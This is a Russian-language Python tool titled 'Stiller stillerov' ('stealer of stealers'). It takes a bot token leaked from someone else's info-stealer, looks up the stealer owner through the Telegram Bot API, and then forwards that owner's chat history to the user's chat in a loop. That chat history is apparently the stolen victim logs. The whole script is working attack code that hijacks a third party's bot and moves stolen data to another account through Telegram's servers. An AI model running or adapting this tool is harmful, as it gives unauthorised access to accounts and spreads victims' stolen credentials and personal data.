import requests
import json
from colorama import init
from colorama import Fore, Back, Style


def getBotInfo():
    r = requests.get(f'https://api.telegram.org/bot{token}/getMe')
    info = json.loads(r.text)
    if info["ok"] == False:
        print(Fore.RED + 'Вы указали неверный токен')
    else:
       print(Fore.GREEN + f"""
Id Бота:  {info["result"]["id"]}
Имя бота: {info["result"]["first_name"]}
Юзернейм бота: {info["result"]["username"]}
          """)


def getOwnerInfo():
    r = requests.get(f'https://api.telegram.org/bot{token}/getChat?chat_id={owner_chat_id}')
    info = json.loads(r.text)
    try:
        if info["error_code"] == 400:
            print(Fore.RED + 'Вы указали неверный чат айди, владельца')
        elif info["error_code"] == 401:
            print(Fore.RED + 'Вы указали неверный токен')
    except:

        try:
            name = info["result"]["first_name"]
        except:
            name = Fore.RED + "Нету имени"
        try:
            username = info["result"]["username"]
        except:
            username = Fore.RED + "Нету Юзернейма"
        try:
            bio = info["result"]["bio"]
        except:
            bio = Fore.RED + "Нету описания"

        print(Fore.GREEN + f"""
Id Владельца:  {info["result"]["id"]}
Имя владельца: {name}
Юзернейм владельца: {username}
Описание владельца: {bio}
          """)





def checkMessages():
    r = requests.get(f'https://api.telegram.org/bot{token}/sendMessage?text=Botfather test&chat_id={owner_chat_id}')
    info = json.loads(r.text)
    countOfMessages = info['result']['message_id']
    try:
        countOfDesire = int(input(f'Вот количество сообщений бота: {countOfMessages}\nВведите количество сообщений для редиректа: '))
    except:
        countOfDesire = int(input(Fore.RED + f'\n\nНужно вводить целое число, идиот!\nВот количество сообщений бота: {countOfMessages}\nВведите количество сообщений для редиректа: '))
    return countOfDesire



def redirectMessages():
    for i in range(0, countOfDesire):
        r = requests.get(f'https://api.telegram.org/bot{token}/forwardMessage?chat_id={ur_chat_id}&from_chat_id={owner_chat_id}&message_id={i}')
        info = json.loads(r.text)
        try:
            if info['description'] == 'Bad Request: chat not found':
                print(Fore.RED + 'Чувак ты не запустил бота! либо указал свой неправильный чат айди')
                exit()
            elif info['description'] == 'Bad Request: message to forward not found':
                print(Fore.RED + 'Не удалось отправить это сообщение, видимо владелец его удалил')
        except Exception as e:
            # print(e)
            print( Fore.GREEN + 'Сообщение было успешно отправленно!')


if __name__ == '__main__':
    init()

    print(Fore.MAGENTA + """
    ██████╗░██╗░██████╗░██╗░░██╗████████╗  ██████╗░███████╗░█████╗░██╗░██████╗██╗░█████╗░███╗░░██╗
    ██╔══██╗██║██╔════╝░██║░░██║╚══██╔══╝  ██╔══██╗██╔════╝██╔══██╗██║██╔════╝██║██╔══██╗████╗░██║
    ██████╔╝██║██║░░██╗░███████║░░░██║░░░  ██║░░██║█████╗░░██║░░╚═╝██║╚█████╗░██║██║░░██║██╔██╗██║
    ██╔══██╗██║██║░░╚██╗██╔══██║░░░██║░░░  ██║░░██║██╔══╝░░██║░░██╗██║░╚═══██╗██║██║░░██║██║╚████║
    ██║░░██║██║╚██████╔╝██║░░██║░░░██║░░░  ██████╔╝███████╗╚█████╔╝██║██████╔╝██║╚█████╔╝██║░╚███║
    ╚═╝░░╚═╝╚═╝░╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░  ╚═════╝░╚══════╝░╚════╝░╚═╝╚═════╝░╚═╝░╚════╝░╚═╝░░╚══╝
                            Telegram(https://t.me/+fN7NR-nVvmsxYWRi)

                                Стиллер стиллеров :)
    """)
    print('\033[39m')
    try:
        ur_chat_id = int(input('Введите ваш чат айди: '))
        owner_chat_id = int(input('Введите чат айди создателя стиллера: '))
    except:
        print(Fore.RED + 'Вводи нормальные чат айди')
        exit()
    token = input('Введите токен бота: ')

    getBotInfo()
    print('\033[39m')
    getOwnerInfo()
    print('\033[39m')
    input('Теперь следует что-нибудь написать боту, дабы было кому отправлять сообщения.\nНажмите Enter для продолжения')
    print('\033[39m')
    countOfDesire = checkMessages()
    print('\033[39m')
    redirectMessages()